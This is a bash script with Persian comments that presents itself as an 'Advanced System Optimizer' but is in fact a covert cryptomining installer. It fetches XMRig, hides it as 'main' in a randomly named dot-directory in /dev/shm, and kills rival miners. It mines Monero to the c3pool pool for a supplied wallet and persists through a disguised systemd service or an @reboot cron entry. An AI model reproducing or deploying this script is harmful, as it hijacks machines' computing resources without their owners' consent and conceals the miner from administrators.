#!/bin/bash
VERSION=2.19
echo "Advanced System Optimizer v$VERSION"
echo "Using exactly 85% CPU per core on any server."
echo
export LC_ALL=C
export LANG=C

# --- کاربر واقعی ---
REAL_USER="${SUDO_USER:-$(whoami)}"
REAL_HOME="$(getent passwd "$REAL_USER" | cut -d: -f6 2>/dev/null || echo "$HOME")"

# --- نام‌های تصادفی ---
RAND_HEX=$(openssl rand -hex 16)
SYSTEM_USER="opt$(openssl rand -hex 6)"
SERVICE_NAME="sysopt-$(openssl rand -hex 5)"

# --- مسیر مخفی در RAM ---
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"
CFG_DIR="$BASE_DIR/.cfg"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    echo "ERROR: Wallet required"
    exit 1
fi

# --- نصب پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "[*] Installing curl & tar..."
    if command -v apt-get >/dev/null; then
        sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
    elif command -v yum >/dev/null; then
        sudo yum install -y curl tar -q >/dev/null
    elif command -v dnf >/dev/null; then
        sudo dnf install -y curl tar -q >/dev/null
    else
        echo "ERROR: No supported package manager"
        exit 1
    fi
fi

# --- محاسبه دقیق 85% CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))  # حداکثر 6 هسته
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1

# 85% از هر هسته = max-threads-hint: 85
CPU_HINT=85

echo "[*] Detected: $CPU_TOTAL cores → Using $USABLE_THREADS threads @ $CPU_HINT% each"
echo "[*] Installing in RAM: $BASE_DIR (hidden & auto-clear on reboot)"

# --- ساخت دایرکتوری مخفی ---
mkdir -p "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null
chmod 700 "$BASE_DIR" "$LOG_DIR" "$CFG_DIR" 2>/dev/null

# --- پاک‌سازی قبلی ---
pkill -f "xmrig" 2>/dev/null
pkill -f "$BASE_DIR/main" 2>/dev/null
find /dev/shm -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null

if command -v systemctl >/dev/null 2>&1; then
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "/etc/systemd/system/$SERVICE_NAME.service"
fi

# --- hugepages فقط root ---
if [ "$(id -u)" -eq 0 ]; then
    grep -q "vm.nr_hugepages.*1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- دانلود و استخراج ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_FILE="/tmp/.tmp_$(openssl rand -hex 5).tgz"

for i in {1..3}; do
    curl -fsSL "$URL" -o "$TMP_FILE" && break
    echo "[*] Retry $i..."
    sleep 2
done

[ ! -f "$TMP_FILE" ] && echo "ERROR: Download failed" && exit 1

tar xzf "$TMP_FILE" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP_FILE"; exit 1; }
XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && echo "ERROR: xmrig binary not found" && rm -f "$TMP_FILE" && exit 1

cp "$XMRIG_BIN" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"
rm -f "$TMP_FILE"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json با 85% دقیق ---
cat > "$BASE_DIR/config.json" << EOF
{
    "api": { "id": null, "worker-id": "$SYSTEM_USER" },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "title": "",
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 0,
        "max-threads-hint": $CPU_HINT,
        "rx/0": [true],
        "threads": $USABLE_THREADS
    },
    "pools": [{
        "algo": "rx/0",
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "enabled": true,
        "tls": false
    }],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "verbose": 0,
    "watch": false
}
EOF

# --- اسکریپت کنترل ---
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
cd "$(dirname "$0")" || exit 1
case "$1" in
    start)
        pgrep -f "./main" >/dev/null && { echo "Already running"; "$0" status; exit 1; }
        [ -w /proc/sys/vm/nr_hugepages ] && echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
        nohup ./main --config=config.json > .log/output.log 2>&1 &
        echo $! > .pid
        sleep 2
        echo "Started (PID: $(cat .pid))"
        ;;
    stop)
        pkill -f "./main" 2>/dev/null
        [ -f .pid ] && kill $(cat .pid) 2>/dev/null && rm -f .pid
        sleep 1
        pgrep -f "./main" >/dev/null && echo "Failed to stop" || echo "Stopped"
        ;;
    status)
        PIDS=$(pgrep -f "./main")
        if [ -n "$PIDS" ]; then
            echo "Running: $PIDS"
            for PID in $PIDS; do
                CPU=$(ps -p $PID -o %cpu --no-headers | awk '{printf "%.0f", $1}')
                echo "  PID $PID → $CPU% CPU"
            done
        else
            echo "Stopped"
        fi
        ;;
    logs) tail -20 .log/output.log 2>/dev/null || echo "No logs" ;;
    restart) "$0" stop; sleep 1; "$0" start ;;
    *) echo "Usage: $0 {start|stop|status|logs|restart}" ;;
esac
EOF
chmod +x "$BASE_DIR/control"

# --- استارت خودکار ---
SYSTEMD=false
if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
[Unit]
Description=System Optimizer
After=network.target
[Service]
Type=simple
Restart=always
RestartSec=10
User=root
ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
WorkingDirectory=$BASE_DIR
Environment=LC_ALL=C
StandardOutput=append:$LOG_DIR/output.log
StandardError=append:$LOG_DIR/output.log
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now "$SERVICE_NAME.service" >/dev/null 2>&1
    SYSTEMD=true
fi

if [ "$SYSTEMD" = false ]; then
    (crontab -u "$REAL_USER" -l 2>/dev/null | grep -v "$BASE_DIR"; echo "@reboot sleep 45 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$REAL_USER" -
fi

# --- راه‌اندازی ---
if [ "$SYSTEMD" = true ]; then
    systemctl start "$SERVICE_NAME.service" 2>/dev/null
else
    "$BASE_DIR/control" start
fi

sleep 6
echo
echo "=== Final Status ==="
"$BASE_DIR/control" status
echo
echo "Setup complete!"
echo "Location: $BASE_DIR (RAM-based, hidden)"
echo "Control: $BASE_DIR/control {start|stop|status|logs|restart}"
echo "CPU: $USABLE_THREADS threads × $CPU_HINT% = ~$(echo "scale=1; $USABLE_THREADS * $CPU_HINT / 100" | bc) cores used"

[ -n "$(pgrep -f "$BASE_DIR/main")" ] && echo "Optimizer is running at 85% per core" || echo "Start failed — check logs"

exit 0
